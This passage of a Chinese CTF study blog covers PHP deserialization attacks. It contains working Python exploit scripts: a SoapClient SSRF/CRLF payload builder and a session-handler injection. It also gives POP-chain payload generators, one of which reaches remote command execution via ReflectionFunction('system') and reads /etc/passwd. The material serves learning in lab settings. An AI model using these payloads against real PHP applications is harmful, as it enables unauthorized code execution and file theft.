        ("\x00SoapClient\x00sdl", php_n()),
        ("\x00SoapClient\x00typemap", php_n()),
        ("\x00SoapClient\x00httpsocket", php_n()),
        ("\x00SoapClient\x00httpurl", php_n()),
        ("\x00SoapClient\x00_login", php_n()),
        ("\x00SoapClient\x00_password", php_n()),
        ("\x00SoapClient\x00_use_digest", php_b(False)),
        ("\x00SoapClient\x00_digest", php_n()),
        ("\x00SoapClient\x00_proxy_host", php_n()),
        ("\x00SoapClient\x00_proxy_port", php_n()),
        ("\x00SoapClient\x00_proxy_login", php_n()),
        ("\x00SoapClient\x00_proxy_password", php_n()),
        ("\x00SoapClient\x00_exceptions", php_b(exceptions)),
        ("\x00SoapClient\x00_encoding", php_n()),
        ("\x00SoapClient\x00_classmap", php_n()),
        ("\x00SoapClient\x00_features", php_n()),
        ("\x00SoapClient\x00_connection_timeout", php_i(0)),
        ("\x00SoapClient\x00_stream_context", php_i(0)),
        ("\x00SoapClient\x00_user_agent", php_s(ua)),
        ("\x00SoapClient\x00_keep_alive", php_b(keep_alive)),
        ("\x00SoapClient\x00_ssl_method", php_n()),
        ("\x00SoapClient\x00_soap_version", php_i(soap_version)),
        ("\x00SoapClient\x00_use_proxy", php_n()),
        ("\x00SoapClient\x00_cookies", php_a0()),
        ("\x00SoapClient\x00__default_headers", php_n()),
        ("\x00SoapClient\x00__soap_fault", php_n()),
        ("\x00SoapClient\x00__last_request", php_n()),
        ("\x00SoapClient\x00__last_response", php_n()),
        ("\x00SoapClient\x00__last_request_headers", php_n()),
        ("\x00SoapClient\x00__last_response_headers", php_n()),
    ]

    payload = f'O:10:"SoapClient":{len(props)}:{{'
    for k, v in props:
        payload += php_s(k) + v
    payload += '}'
    return payload

def guess_flag_urls(base_url: str, extra_paths=None):
    base = base_url if base_url.endswith("/") else base_url + "/"
    candidates = [
        urljoin(base, "flag.txt"),
        urljoin(base, "./flag.txt"),
        urljoin(base, "../flag.txt"),
        urljoin(base, "../../flag.txt"),
    ]
    if extra_paths:
        for p in extra_paths:
            candidates.append(urljoin(base, p))
    # 去重
    uniq, seen = [], set()
    for u in candidates:
        if u not in seen:
            uniq.append(u)
            seen.add(u)
    return uniq

def main():
    parser = argparse.ArgumentParser(description="Generic SoapClient unserialize exploit template for lab/CTF.")
    parser.add_argument("target", help="Vulnerable URL, e.g. http://localhost:8010/")
    parser.add_argument("--param", default="param", help="GET parameter name, default: param")
    parser.add_argument("--method", default="daydream", help="Method name to invoke, default: daydream")
    parser.add_argument("--internal-url", required=True, help="Internal flag.php URL, e.g. http://127.0.0.1:8010/flag.php")
    parser.add_argument("--uri", default="http://127.0.0.1/", help="SoapClient uri value")
    parser.add_argument("--fake-ua", default="admin", help="First line of injected User-Agent") #修改代理
    parser.add_argument("--post-body", default="pass=password", help="Injected POST body")
    parser.add_argument("--keep-alive", action="store_true", help="Enable keep_alive")
    parser.add_argument("--no-exceptions", action="store_true", help="Set exceptions=false")
    parser.add_argument("--soap-version", type=int, default=1, help="SOAP version integer, usually 1")
    parser.add_argument("--read-path", action="append", default=[], help="Extra flag.txt path to try, repeatable")
    parser.add_argument("--show-payload", action="store_true", help="Print serialized payload")
    args = parser.parse_args()

    payload = build_payload(
        internal_url=args.internal_url,
        uri=args.uri,
        fake_ua=args.fake_ua,
        post_body=args.post_body,
        keep_alive=args.keep_alive,
        exceptions=not args.no_exceptions,
        soap_version=args.soap_version,
    )

    if args.show_payload:
        print(payload)
        print("=" * 60)

    sess = requests.Session()

    print(f"[+] target        : {args.target}")
    print(f"[+] internal-url  : {args.internal_url}")
    print(f"[+] param         : {args.param}")
    print(f"[+] invoke method : {args.method}")
    print(f"[+] fake ua       : {args.fake_ua!r}")
    print(f"[+] post body     : {args.post_body!r}")
    print(f"[+] payload bytes : {len(payload.encode())}")

    try:
        r = sess.get(args.target, params={args.param: payload}, timeout=10)
        print(f"[+] trigger status: {r.status_code}")
        print("[+] response head:")
        print(r.text[:500])
    except Exception as e:
        print(f"[-] trigger failed: {e}")
        return

    print("\n[+] trying flag paths...")
    for u in guess_flag_urls(args.target, extra_paths=args.read_path):
        try:
            rr = sess.get(u, timeout=6)
            print(f"    {u} -> {rr.status_code}")
            if rr.status_code == 200 and rr.text.strip():
                print("\n[FLAG/CONTENT]")
                print(rr.text)
                return
        except Exception as e:
            print(f"    {u} -> error: {e}")

    print("\n[-] No flag.txt found in tried locations.")

if __name__ == "__main__":
    main()
```

------

最基础的用法

你的本地是 8010 端口，那最常用就是：

```
python exp.py http://localhost:8010/ --internal-url http://127.0.0.1:8010/flag.php
```

如果站点里 `flag.php` 不在根目录，再试：

```
python exp.py http://localhost:8010/ --internal-url http://127.0.0.1:8010/level11/flag.php
```

如果你怀疑 `flag.txt` 位置也不一样：

```
python exp.py http://localhost:8010/ \
  --internal-url http://127.0.0.1:8010/flag.php \
  --read-path level11/flag.txt \
  --read-path ../level11/flag.txt
```

------

参数怎么调

1. `--internal-url`

这是最重要的参数。

它决定 `SoapClient` 最终去打哪里。
 这题里真正要命中的就是 `flag.php`。如果地址错了，再好的 payload 也没用。题目注释已经说明 `flag.php` 负责检查 `User-Agent` 和 `pass`，然后写 `flag.txt`。

怎么判断该不该改它

如果你看到：

- 已经触发 `SoapClient->__call()`
- 但 `flag.txt` 一直没有

第一优先就改这个。

常见尝试

```
http://127.0.0.1/flag.php
http://localhost/flag.php
http://127.0.0.1:8010/flag.php
http://localhost:8010/flag.php
http://127.0.0.1:8010/level11/flag.php
```

------

2. `--post-body`

这题默认是：

```
pass=password
```

因为 `flag.php` 读取的是：

```
$pass = $_POST['pass'];
if ($pass == 'password') ...
```

所以这里的内容要跟题目要求一模一样。

改它的场景

如果题目变种里不是 `pass=password`，而是：

- `token=admin`
- `a=1&b=2`
- `key=xxxx`

那就改这个参数。

例如：

```
python exp.py http://localhost:8010/ \
  --internal-url http://127.0.0.1:8010/flag.php \
  --post-body "token=admin"
```

------

3. `--fake-ua`

这题默认是：

```
admin
```

因为 `flag.php` 要求：

```
$user == 'admin'
```

所以这个参数本质上是 **你伪造的请求头第一行值**。

什么时候改

只有题目要求变了才改。
 比如要求 `User-Agent: Mozilla/5.0`，就换成那个。

------

4. `--keep-alive`

默认我建议 **不要开**。

不开时，脚本会自动加：

```
Connection: close
```

这对 CRLF 注入这种题通常更稳。
 因为你想要的是尽快把你拼好的报文交给后端解析，不想让连接复用带来奇怪影响。

什么时候试开

只有你怀疑目标环境对 `close` 不友好时再试：

```
python exp.py http://localhost:8010/ \
  --internal-url http://127.0.0.1:8010/flag.php \
  --keep-alive
```

------

5. `--no-exceptions`

有些环境里 `SoapClient` 报错会中断页面显示。
 比如你之前见到的：

```
looks like we got no XML document
```

这往往说明请求已经打出去了，只是返回值不是 SOAP XML。
 如果你想看看不开异常时，页面表现会不会更稳定，可以试：

```
python exp.py http://localhost:8010/ \
  --internal-url http://127.0.0.1:8010/flag.php \
  --no-exceptions
```

------

6. `--read-path`

这是用来补路径猜测的。

如果脚本默认尝试：

- `/flag.txt`
- `./flag.txt`
- `../flag.txt`

都没有，你就加更多候选。

例如：

```
python exp.py http://localhost:8010/ \
  --internal-url http://127.0.0.1:8010/flag.php \
  --read-path level11/flag.txt \
  --read-path uploads/flag.txt
```



## 7.session注入触发 反序列化

```
<?php
highlight_file(__FILE__);
/*hint.php*/
session_start();
class Flag{
    public $name;
    public $her;
    function __wakeup(){
        $this->name=$this->her=md5(rand(1, 10000));
        if ($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}
?>
<br><a href="../level14">点击进入第十四关</a>
```

```
<?php
include("flag.php");
highlight_file(__FILE__);
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = $_GET['a'];
?>
```

这是一个典型的 **Session 处理器不一致** 导致的反序列化注入：

`hint.php` 使用 `php_serialize` 方式写 session。

`index.php` 默认使用 `php` 方式读 session。

两种格式不同，导致同一个 session 文件被错读。

`php_serialize`：把整个 `$_SESSION` 当普通 `PHP` 变量序列化，格式类似：

`a:1:{s:1:"a";s:41:"|O:4:"Flag":2:{...}";}`

`php`（默认）：按 `key|serialized_value` 的分隔协议解析，遇到 `|` 会把它当键值分隔符。

给 `$_GET['a']` 传：

`|O:4:"Flag":2:{s:4:"name";N;s:3:"her";N;}`

在 `php_serialize` 写入阶段时，这只是普通字符串。

但在 `php` 读取阶段，解析器会把 `|` 后面当成一个序列化值，从而把 `Flag` 对象反序列化出来。

反序列化后触发 `Flag::__wakeup()`，执行了输出flag。

这道题的知识点很简单，但在实际操作时，直接操作很容易出问题。

因为先是高亮显示源码，然后再启用session，直接操作会导致实际注入触发时，两个网页或者当个网页的session没有变化，从没没有触发反序列化，得到flag。

```
#!/usr/bin/env python3
import random
import re
import string
import sys
from urllib.parse import urljoin

import requests


def build_sid(prefix="ctf"):
    chars = string.ascii_lowercase + string.digits
    return prefix + "".join(random.choice(chars) for _ in range(16))


def normalize_base(base):
    if not base.startswith("http://") and not base.startswith("https://"):
        base = "http://" + base
    return base.rstrip("/") + "/"


def extract_flag(text):
    patterns = [
        r"Geesec\{[^\r\n<]{1,200}\}",
        r"flag\{[^\r\n<]{1,200}\}",
        r"ctf\{[^\r\n<]{1,200}\}",
        r"[A-Za-z0-9_\-]*\{[0-9a-fA-F\-]{16,}\}",
    ]
    for p in patterns:
        m = re.search(p, text, flags=re.I)
        if m:
            return m.group(0)
    return None


def main():
    base = (
        sys.argv[1]
        if len(sys.argv) > 1
        else "http://80-f09dbe82-da40-4ad5-bc59-923978604ab2.challenge.ctfplus.cn"
    )
    base = normalize_base(base)

    injection_path = "hint.php"
    trigger_path = "index.php"
    payload = '|O:4:"Flag":2:{s:4:"name";N;s:3:"her";N;}'

    sid = build_sid()
    injection_url = urljoin(base, injection_path)
    trigger_url = urljoin(base, trigger_path)

    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            # 关键：即使服务端报 headers already sent，也能固定同一个 session
            "Cookie": f"PHPSESSID={sid}",
        }
    )

    print(f"[*] Base URL      : {base}")
    print(f"[*] Injection URL : {injection_url}")
    print(f"[*] Trigger URL   : {trigger_url}")
    print(f"[*] PHPSESSID     : {sid}")

    try:
        r1 = s.get(injection_url, params={"a": payload}, timeout=15)
        print(f"[+] Inject request sent, status={r1.status_code}, len={len(r1.text)}")
    except Exception as e:
        print(f"[-] Injection failed: {e}")
        sys.exit(1)

    try:
        r2 = s.get(trigger_url, timeout=15)
        print(f"[+] Trigger request sent, status={r2.status_code}, len={len(r2.text)}")
    except Exception as e:
        print(f"[-] Trigger failed: {e}")
        sys.exit(1)

    flag = extract_flag(r2.text)
    if flag:
        print(f"[+] FLAG FOUND: {flag}")
        sys.exit(0)

    print("[-] Flag not found in response.")
    print("[i] Debug tail (last 800 chars):")
    tail = r2.text[-800:]
    print(tail)
    sys.exit(2)


if __name__ == "__main__":
    main()

```



## 8.

























# POP链学习：

## 1.

```
<?php
include("flag.php");
highlight_file(__FILE__);
class you
{
    private $body;
    private $pro='';
    function __destruct()
    {
        $project=$this->pro;
        $this->body->$project();
    }
}

class my
{
    public $name;

    function __call($func, $args)
    {
        if ($func == 'yourname' and $this->name == 'myname') {
            include('flag.php');
            echo $flag;
        }
    }
}
$a=$_GET['a'];
unserialize($a);
?>
```

这边是一个非常简易的POP链。

目标是执行 `__call` 方法里面的if条件下的 `echo $flag;` 。

要执行这需要让 `$func == 'yourname' and $this->name == 'myname'` ，这段代码的含义就不讲了。

实际上，就是我们需要触发 `__call` 方法。

这个方法触发的条件是访问一个不存在或者不可访问的方法。

根据源码，可以看见 `$this->body->$project();` 这一段，天然就可以完成我们触发条件。

如果我们把 `body` 设置为 `my` 类，然后 `$project()` 设置为 `yourname`。

这样代码就会调用 `my` 类去执行 `yourname ` 方法，达成条件，并可以进行传参，使得条件也成立。

```
<?php
class you {
    private $body;
    private $pro;

    public function __construct($b, $p) {
        $this->body = $b;
        $this->pro = $p;
    }
}

class my {
    public $name = 'myname';
}

$obj_my = new my();

$obj_you = new you($obj_my, 'yourname');

echo urlencode(serialize($obj_you));
?>
```

 

## 2.

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include "secret.php";

class Challenge{
    public $file;
    public function Sink()
    {
        echo "<br>!!!A GREAT STEP!!!<br>";
        echo "Is there any file?<br>";
        if(file_exists($this->file)){
            global $FLAG;
            echo $FLAG;
        }
    }
}

class Geek{
    public $a;
    public $b;
    public function __unserialize(array $data): void
    {
        $change=$_GET["change"];
        $FUNC=$change($data);
        $FUNC();
    }
}

class Syclover{
    public $Where;
    public $IS;
    public $Starven;
    public $Girlfriend;
    public function __toString()
    {
        echo "__toString is called<br>";
        $eee=new $this->Where($this->IS);
        $fff=$this->Starven;
        $eee->$fff($this->Girlfriend);
       
    }
}

unserialize($_POST['data']);
```

1. 利用反序列化入口 `unserialize($_POST['data'])`
2. 借助 `Geek::__unserialize` 的可控函数调用 `change($data)`
3. 用 `current($data)` 取出 `[obj, "__toString"]`
4. `__toString` 中通过 `ReflectionFunction('system')->invoke(cmd)` 拿 RCE
5. 枚举 SUID，利用 `/usr/bin/file -m /flag` 报错回显 flag

直接讲解吧，序列化数据的入口是data参数，根据我们的目标来看，我们最终是利用类`Syclover`，使用这个函数`ReflectionFunction`完成对于`system`的调用，获得rce。

至于为什么能调用到`system`，下面的函数有介绍，这边就不展开了。

思路就是：
如何触发`tostring`呢，条件是把对象当字符串，往上看，类Geek这个存在一个数组回调的调用函数情况。

当我们对change传参为current，然后`__unserialize`又因为我们的数据会被反序列化触发，完成数据的还原，所以这边就会变成一个数组包含对象和方法，完成调用。

触发完`tostring`，我们还得完成`ReflectionFunction`的布局。

`$eee=new $this->Where(*$**this*->IS);`

`$fff=*$**this*->Starven;`

`$eee->$fff(*$**this*->Girlfriend);`

```
$sy->Where = 'ReflectionFunction';
$sy->IS = 'system';
$sy->Starven = 'invoke';
$sy->Girlfriend = $cmd;
```

第一行，就会变成`ReflectionFunction`调用`system`。

第二行和第三和组合变成，`invoke`触发`ReflectionFunction`的`system`执行我们的命令。

POP链实际为：

```
Geek->curren($data)->Syclover->ReflectionFunction::invoke(system('$cmd'))
```

```
<?php
class Geek {
    public $a;
    public $b;
}

class Syclover {
    public $Where;
    public $IS;
    public $Starven;
    public $Girlfriend;
}

$cmd = '/usr/bin/file -m /flag /etc/passwd 2>&1';

$sy = new Syclover();
$sy->Where = 'ReflectionFunction';
$sy->IS = 'system';
$sy->Starven = 'invoke';
$sy->Girlfriend = $cmd;

$g = new Geek();
$g->a = [$sy, '__toString'];
$g->b = 'rce_go';

$payload = serialize($g);
echo "\n$payload\n\n";

```



## 3.

```
<?php
error_reporting(0);
class Good{
    public $g1;
    private $gg2;

    public function __construct($ggg3)
    {
        $this->gg2 = $ggg3;
    }

    public function __isset($arg1)
    {
        if(!preg_match("/a-zA-Z0-9~-=!\^\+\(\)/",$this->gg2))
        {
            if ($this->gg2)
            {
                $this->g1->g1=666;
            }
        }else{
            die("No");
        }
    }
}
class Luck{
    public $l1;
    public $ll2;
    private $md5;
    public $lll3;
    public function __construct($a)
    {
        $this->md5 = $a;
    }
    public function __toString()
    {
        $new = $this->l1;
        return $new();
    }

    public function __get($arg1)
    {
        $this->ll2->ll2('b2');
    }

    public function __unset($arg1)
    {
        if(md5(md5($this->md5)) == 666)
        {
            if(empty($this->lll3->lll3)){
                echo "There is noting";
            }
        }
    }
}

class To{
    public $t1;
    public $tt2;
    public $arg1;
    public function  __call($arg1,$arg2)
    {
        if(urldecode($this->arg1)===base64_decode($this->arg1))
        {
            echo $this->t1;
        }
    }
    public function __set($arg1,$arg2)
    {
        if($this->tt2->tt2)
        {
            echo "what are you doing?";
        }
    }
}
class You{
    public $y1;
    public function __wakeup()
    {
        unset($this->y1->y1);
    }
}
class Flag{
    public function __invoke()
    {
        echo "May be you can get what you want here";
        array_walk($this, function ($make, $colo) {
            $three = new $colo($make);
            foreach($three as $tmp){
            echo ($tmp.'<br>');
            }  
        });
    }
}

if(isset($_POST['D0g3']))
{
    unserialize($_POST['D0g3']);
}else{
    highlight_file(__FILE__);
}
?>
```

### `You::__wakeup`->`unset($this->y1->y1);`->`Luck::__unset`->`empty($this->lll3->lll3)`->`Good::__isset`->`$this->g1->g1=666;`->`To::__calll`->`echo $this->t1;`->`Flag::__invoke`

大致的pop链就是这样。

通过反序列化 `You` 的实例触发 `__wakeup` ,执行 删除操作，又将 `y1` 提前设置为 `Luck` 的实例，然后触发 `__unset ` ，绕过哈希碰撞后，执行 `empty($this->lll3->lll3` 确认操作，完成对 `__isset` 的触发，提前做好 `Good` 类的实例化，完成对 `$this->g1->g1=666;` 完成对 `__call` 的触发 ，执行 `echo $this->t1;` ，完成将字符串当作函数调用，触发 `__invoke` ，最终读取我们指定的文件。

```
<?php
// error_reporting(0);
class Good{
    public $g1;
    private $gg2='[';

}
class Luck{
    public $l1;
    public $ll2;
    private $md5='Okg';#Swq
    public $lll3;
}

class To{
    public $t1;
    public $tt2;
    public $arg1;
}
class You{
    public $y1;

}
class Flag{
}
$a=new You();
$b=new Luck();
$a->y1=$b;
$c=new Good();
$b->lll3=$c;
$d=new To();
$c->g1=$d;
$d->tt2=$b;
$b->ll2=$d;
$d->t1=$b;
$e=new Flag();
$b->l1=$e;
// $e->FileSystemIterator='/';
$e->SplFileObject='/FfffLlllLaAaaggGgGg';
echo urlencode(serialize($a));
?>
```

`SplFileObject` 这个特殊类帮助我读取文件，但是这边有一点，我有点懵逼，因为在没有远程rce的情况下，我们究竟要如何得知flag的文件名为 `/FfffLlllLaAaaggGgGg` ，这是题目的一个wp，我就这边有点懵，到底是如何得知 flag 的文件名呢。



---



## 4.

```

Warning: file_put_contents(flag.php): failed to open stream: Permission denied in /var/www/html/flag.php on line 13
<?php
//flag is in flag.php
include("flag.php");
highlight_file(__FILE__);
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
?>
<br><a href="../level10">点击进入第十关</a>
点击进入第十关
```

这边最终目的是到达 `Modidier` 的 `__invoke` 方法，将 `$var` 设置为`flag.php`，就可以读取到flag。

根据触发方法来看，只要哪一个方法直接 `return 对象` 就可以触发。

可以 `Test` 的 `__get` 方法，把 `$p` 设置为  `Modidier` 的对象。

触发 `__get` 需要读取一个不存在或者没有权限的属性，可以利用 `Show` 的 `__ToString` 方法，这边 `return $this->str->source` ，轻易就可以触发。

触发 `__ToString` 又需要把对象当字符串。

直接

```
    public function __wakeup(){
        echo $this->source;
```

这样就符合条件。

所以POP链为：

### `Show::__wakeup->Show::__toString->Test::__get->Modifier::__invoke`

```
<?php
class Modifier {
    private $var='flag.php';

}

class Show{
    public $source;
    public $str;
}

class Test{
    public $p;
}

$a=new Modifier();

$b=new Test();
$b->p=$a;

$c=new Show();
$c->str=$b;

$d=new Show();
$d->source=$c;

echo urlencode(serialize($d));

?>
```



## 5.





















# 常用漏洞函数以及适用版本

## 1.create_function

`create_function('', $code)`

相当于：

```
function __lambda_func() {
    { $code内容 }
}


```

是一个类似eval的架构，只是需要一些简单的闭合操作。

可以用来执行php的代码。

| **PHP 版本**            | **状态**     | **执行行为**                                                 |
| ----------------------- | ------------ | ------------------------------------------------------------ |
| **PHP 4.0.1 - PHP 7.1** | **正常使用** | 函数运行良好，不会有任何警告。这是该漏洞最容易利用的时期。   |
| **PHP 7.2 - PHP 7.4**   | **已弃用 **  | 代码仍然可以执行，但 PHP 会抛出一个 `Deprecated` 级别的警告。 |
| **PHP 8.0 及以上**      | **已移除 **  | 调用它会直接触发 Fatal error，提示函数不存在。               |



## 2.current（数组回调）

在 PHP 中，`current($array)` 是一个内置函数，它的唯一作用是：**返回数组中当前指针指向的单元（默认就是第一个元素）**。

```
$change = "current"; // 这一步是通过 $_GET["change"] 传进来的
$data = ['a' => "目标值", 'b' => "干扰项"];

$FUNC = $change($data); // 相当于执行了 current($data)
// 此时 $FUNC 的值就是 "目标值"
```

![image-20260410203855399](/images/image-20260410203855399.png)

利用数组回调获得数组，数组内包含对象和方法，完成对方法的调用。







## 3.ReflectionFunction

正常情况下，我们调用函数是硬编码的：`system('ls');`。 而使用 `ReflectionFunction`，你可以把函数当作一个**对象**来处理。你可以查看这个函数有哪些参数、是在哪个文件定义的，甚至可以直接去执行它。

```
$ref = new ReflectionFunction('system');
```

* `$ref->getName()`：获取函数名。

* `$ref->getParameters()`：获取参数列表。

* `$ref->isInternal()`：判断是否是 PHP 内置函数。

```
<?php
function secret_shell($cmd) {
    return "执行了命令: " . $cmd;
}

// 1. 正常调用
echo secret_shell('whoami') . "\n";

// 2. 反射调用
$funcName = 'secret_shell';
$ref = new ReflectionFunction($funcName);

if ($ref->hasReturnType()) {
    echo "这个函数有返回值类型定义。\n";
}

// 动态执行
echo $ref->invoke('ls -alt');
```



























# 好用的类：

## 1.SplFileObject

`SplFileObject` 为文件处理提供了一个面向对象的接口。

`SplFileObject` 把整个文件看作一个**对象**，文件的每一行就是这个对象的一个元素。

使用背景：

代码里没有 `system()` 或 `eval()` 时，有一个 `new $a($b)` 且随后有 `foreach` 遍历的地方，就可以通过传入 `$a = "SplFileObject"` 和 `$b = "文件名"` 来实现：

1. **构造**：`new SplFileObject("flag.php")`
2. **触发**：`foreach` 迭代
3. **结果**：文件内容被 `echo` 到页面上。























# 序列化数据结构：

实例拆解：

原始数据：`O:5:"vFREE":2:{s:4:"name";s:5:"vFREE";s:3:"age";s:2:"18";}`

| **标识符**  | **含义**           | **具体到例子**              |
| ----------- | ------------------ | --------------------------- |
| **O**       | **Object**（对象） | 代表这是一个类的实例        |
| **5**       | **类名长度**       | "vFREE" 这几个字母长度为 5  |
| **"vFREE"** | **类名**           | 对象的类名为 `vFREE`        |
| **2**       | **属性数量**       | 该对象内部包含 2 个成员属性 |
| **{...}**   | **数据内容**       | 包含在大括号内的键值对      |

分析：

1. **第一个属性（name）：**
   - `s:4:"name";` -> **键 (Key)**：类型为 String(s)，长度 4，值为 "name"。
   - `s:5:"vFREE";` -> **值 (Value)**：类型为 String(s)，长度 5，值为 "vFREE"。
2. **第二个属性（age）：**
   - `s:3:"age";` -> **键 (Key)**：类型为 String(s)，长度 3，值为 "age"。
   - `s:2:"18";` -> **值 (Value)**：类型为 String(s)，长度 2，值为 "18"。



通用语法规则

- **`s` (String)**: 字符串。格式：`s:长度:"内容";`
- **`i` (Integer)**: 整数。格式：`i:数值;`
- **`d` (Double/Float)**: 浮点数。格式：`d:数值;`
- **`b` (Boolean)**: 布尔值。格式：`b:1;` (true) 或 `b:0;` (false)
- **`N` (Null)**: 空值。格式：`N;`
- **`a` (Array)**: 数组。格式：`a:元素数量:{元素}`
- **`O` (Object)**: 对象。格式：`O:类名长度:"类名":属性数量:{属性}`



# 绕过使用的一些函数：

## 1.str_replace

语法结构如下：
$$
str\_replace(\text{查找值}, \text{替换值}, \text{原始字符串}, [\text{替换次数}])
$$
字符串替换字符串

```
$text = "我喜欢吃苹果";
$new_text = str_replace("苹果", "西瓜", $text);

echo $new_text; // 输出：我喜欢吃西瓜
```

多个目标换成同一个词

```
$words = ["脏话A", "脏话B", "敏感词C"];
$text = "这个人说了脏话A和脏话B";

// 把所有敏感词都换成星号
$clean_text = str_replace($words, "***", $text);
```

映射替换（一对一替换）

```
$search  = ["苹果", "香蕉"];
$replace = ["Apple", "Banana"];
$text    = "桌上有苹果和香蕉";

echo str_replace($search, $replace, $text); 
// 输出：桌上有 Apple 和 Banana
```

 获取替换发生的次数

```
$text = "go go go!";
str_replace("go", "run", $text, $count);

echo $count; // 输出：3（表示替换了3次）
```



## 2.phar伪协议读取文件会自动反序列化

在 PHP 中，很多文件系统函数（如 `md5_file`, `file_exists`, `is_dir` 等）在通过 `phar://` 协议读取文件时，会解析 Phar 文件中的 Metadata。如果 Metadata 存储的是一个序列化对象，PHP 就会对其进行反序列化。

> https://www.cnblogs.com/xxxxxi1/p/18810524



## 3.session反序列化漏洞

利用`php`处理器和`php_serialize`处理器的存储格式差异而产生。

![image-20260411151825121](/images/image-20260411151825121.png)

这边还是得看远程服务器是否存在这样的前提，使得session处理不同。

```
<?php
include("flag.php");
highlight_file(__FILE__);
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = $_GET['a'];
?>
```













---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
